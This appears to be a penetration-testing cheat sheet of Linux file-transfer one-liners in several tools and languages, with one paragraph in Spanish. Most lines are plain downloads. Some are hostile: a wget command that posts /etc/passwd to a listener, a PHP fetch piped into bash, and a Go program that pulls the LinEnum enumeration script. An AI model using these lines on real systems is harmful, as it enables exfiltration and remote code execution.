# Linux File Transfer

### base64

```bash
base64 -w 0 <FILE>; echo
# We copy the content and decode it on our machine:
echo "<PASTE>" | base64 -d > <FILE>
```

### wget/fetch

```bash
# Download:
wget <PATH>
wget <PATH> -O <PATH>/<FILE>
fetch <IP>/<FILE> # FreeBSD
wget -r <URL> # Recursive download.
wget -r --no-parent <URL> # Download only a certain directory.
wget --no-parent -r <URL> --reject="index.html*" # Download only a certain directory (and delete all index.html files).

# Upload:
nc -nvlp 1234 # We listen through a port.
wget --post-file="/etc/passwd" <IP>:<PORT> # Upload with wget
```

### cURL

```bash
curl <IP>/<FILE> -o <PATH>/<FILENAME>
```

### Python

Python is often present in Linux and can be used to download files when Wget and cURL are not available. Although Python is not currently installed by default on Windows, typing Python at a command prompt opens the official Windows Store distribution with a one-click installation. Python is frequently installed on developer and IT computers, and is included by default in major enterprise financial applications such as Bloomberg (Bloomberg Professional Services).

```python
# Python2:
python2
import urllib
urllib.urlretrieve ("<URL>/<FILE>", "<RENAME FILE>")
# Python3:
python3
import urllib.request
urllib.request.urlretrieve("<URL>/<FILE>", "<RENAME FILE>")
```

### openssl (simples files)

OpenSSL is frequently installed and is also often included in other software distributions, and is used by system administrators to generate security certificates, among other tasks. OpenSSL can be used to send "nc-style" files:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem # Create certificate
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/example.sh # Server
openssl s_client -connect <IP>:80 -quiet > example.sh # Download file
```

### Bash (simples files)

También puede haber situaciones en las que no se disponga de herramientas obvias de transferencia de archivos. En este caso, siempre que esté instalada la versión **2.04 o superior de bash** (compilada con `--enable-net-redirections`), se puede utilizar el archivo de dispositivo `/dev/tcp` incorporado para descargas de archivos simples.

```bash
# First, open a server with the resource to be downloaded.
# Download:
exec 3<>/dev/tcp/<LHOST>/80 # Connect to the target web server.
echo -e "GET /<FILE> HTTP/1.1\n\n">&3 # HTTP GET Request
cat <&3 # Print the response.
```

### PHP

```bash
# File_get_contents():
php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILENAME>",$file);'
# Fopen():
php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<FILENAME>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
# If the php-curl module has been installed, it can be used alternatively:
php -r '$rfile = "<URL>"; $lfile = "<FILENAME>"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby

```ruby
ruby -e 'require "net/http"; File.write("<FILE>", Net::HTTP.get(URI.parse("<URL>")))'
```

### Perl

```perl
perl -e 'use LWP::Simple; getstore("<URL>/<FILE>", "<RENAME FILE>");'
```

### Go

```go
package main

import (
     "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}
```
